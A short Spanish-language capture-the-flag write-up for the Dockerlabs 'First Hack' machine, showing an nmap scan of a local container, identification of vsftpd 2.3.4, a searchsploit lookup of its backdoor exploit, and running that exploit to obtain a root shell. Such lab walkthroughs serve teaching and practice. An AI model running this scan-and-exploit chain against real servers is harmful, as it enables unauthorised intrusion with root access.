# First Hack - Dockerlabs

## Enumeración

Realizamos un escaneo con nmap para descubrir los servicios que se están ejecutando en el contenedor.

```bash
sudo nmap -p- -sS --min-rate=5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

```bash
21/tcp   open  ftp     syn-ack ttl 64
6200/tcp open  lm-x    syn-ack ttl 64
```

Vemos que el puerto 21 (FTP) está abierto. Intentamos conectarnos a través de FTP.

```bash
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:mmr): admin
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

Vamos a realizar otro escaneo con nmap para obtener más información sobre el servicio FTP.

```bash
nmap -sCV -p21 172.17.0.2

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
```

```bash
❯ searchsploit vsftpd 2.3.4

vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py

❯ searchsploit -m unix/remote/49757.py
```

Ejecutamos el exploit para obtener acceso al contenedor.

```bash
python3 49757.py 172.17.0.2

whoami
root
```